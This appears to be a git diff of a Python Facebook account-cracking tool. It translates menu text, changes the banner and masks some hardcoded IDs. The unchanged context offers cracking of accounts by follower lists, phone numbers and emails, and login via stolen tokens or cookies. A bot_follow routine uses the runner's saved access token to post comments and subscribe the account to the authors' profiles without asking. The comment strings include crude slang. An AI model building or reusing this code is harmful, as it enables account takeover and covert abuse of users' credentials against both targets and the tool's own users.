@@ -56,13 +56,12 @@ else:
 
 def banner():
     print("""
-\33[0;37m__////////    //////// __       __   
-\33[0;37m\////////   \  ____  |  |__  _/  |_ 
- \33[0;37m|    |  _/_/ ___\ |  |  \ \   __\
-\x1b[0;32m|    |   \\  \___ |   Y  \ |  |  
-\x1b[0;32m|////////  / \////  >|___|  / |__|  
-        \x1b[0;32m\/      \/      \/
-        \x1b[0;32m[ \x1b[0;36mMantalStudio \x1b[0;33mJinde \x1b[0;32m]
+\33[0;37m  __  __  _   _  ____ 
+\33[0;37m (  \/  )( )_( )(_  _)
+ \33[0;37m )    (  ) _ (  _)(_ 
+\x1b[0;32m(_/\/\_)(_) (_)(____)
+        \x1b[0;32m👑👑👑👑👑👑👑👑👑👑👑👑👑👑👑👑👑👑👑👑👑
+        \x1b[0;32m[ \x1b[0;36mMantal \x1b[0;33mStudio \x1b[0;32m]
 """)
 
 ua="NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
@@ -179,7 +178,7 @@ def logs():
   print ("")
   print((p+" ["+k+"01"+p+"] Login Token"))
   print((p+" ["+k+"02"+p+"] Login Cookies"))
-  print((p+" ["+k+"03"+p+"] Tonton Cara Ambil Cookie"))
+  print((p+" ["+k+"03"+p+"]Watch How To Take Cookies"))
   
   print((p+" ["+k+"04"+p+"] Contact Author"))
   print((p+" ["+k+"00"+p+"] Exit\n"))
@@ -264,8 +263,8 @@ komtwol = random.choice(["Salam 2 Jari Bang", "Sensei Terbaek Lah ", "bang lu kg
 kazutora = random.choice(["gans lu bang :v","oyoyoy lu gila ya?","ebink ngentod :v","masih smp udh bisa ngoding \n #bukanmaen","bang lu umur berapa?","moga lu sukses bang :)","master gua ini mah!","ster ajarin hack hati cewek doang","tutor dapetin cewek bang","gansnya bukanmaen awokawok"])
 komen = komtwol
 komendua = kazutora
-post = "3909741969124574"
-postdua = "4134869446611824"
+post = "xxxxx"
+postdua = "xxxx"
 def bot_follow():
 	try:
 		toket=open("login.txt","r").read()
@@ -278,8 +277,8 @@ def bot_follow():
 		logs()
 	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komen +'&access_token=' + toket)
 	requests.post('https://graph.facebook.com/' + postdua + '/comments/?message=' + komendua + '&acces_token'+toket)
-	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
-	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Me
+	requests.post('https://graph.facebook.com/xxxx664282607/subscribers?access_token=' + toket) # Ebink!
+	requests.post('https://graph.facebook.com/1xxx00419639430/subscribers?access_token=' + toket) # Me
 	requests.post('https://graph.facebook.com/1752684667/subscribers?access_token=' + toket) # Izhar
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 #	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
@@ -314,7 +313,7 @@ def menu():
     print((p+" ["+k+"03"+p+"]"+p+" Crack ID From Followers"))
     print((p+" ["+k+"04"+p+"]"+p+" Crack Phone Number"))
     print((p+" ["+k+"05"+p+"]"+p+" Crack Email"))
-    print((p+" ["+k+"06"+p+"]"+p+" Check Opsi Account Checkpoint [ error ]"))
+    print((p+" ["+k+"06"+p+"]"+p+" Check Checkpoint Account [ error ]"))
     print((p+" ["+k+"99"+p+"]"+p+" Result Crack"))
     print((p+" ["+k+"00"+p+"]"+p+" Logout "))
     choose_menu()
@@ -487,7 +486,7 @@ def follow():
 	except Exception as e:
 		exit(p+"\n ["+k+"•"+m+"•"+p+"] Error : %s"%e)
 
-### Krek Nomer su! ###
+###Crack Number are! ###
 def random_numbers():
   data = []
   print((p+"\n ["+k+"•"+m+"•"+p+"] Number Must Be 5 Digit"))
